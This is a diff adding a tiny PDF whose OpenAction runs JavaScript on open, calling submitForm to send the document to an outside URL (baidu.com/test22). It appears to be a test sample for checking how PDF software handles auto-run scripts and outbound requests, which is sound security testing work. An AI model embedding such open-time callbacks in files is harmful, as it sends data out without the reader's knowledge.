@@ -1,0 +1,17 @@
+%PDF-1.4
+1 0 obj
+<<>>
+%endobj
+trailer
+<<
+/Root
+  <</Pages <<>>
+  /OpenAction
+      <<
+      /S/JavaScript
+      /JS(
+      this.submitForm({cURL: "https://www.baidu.com//test22", cSubmitAs: "PDF"});
+      )
+      >>
+  >>
+>>
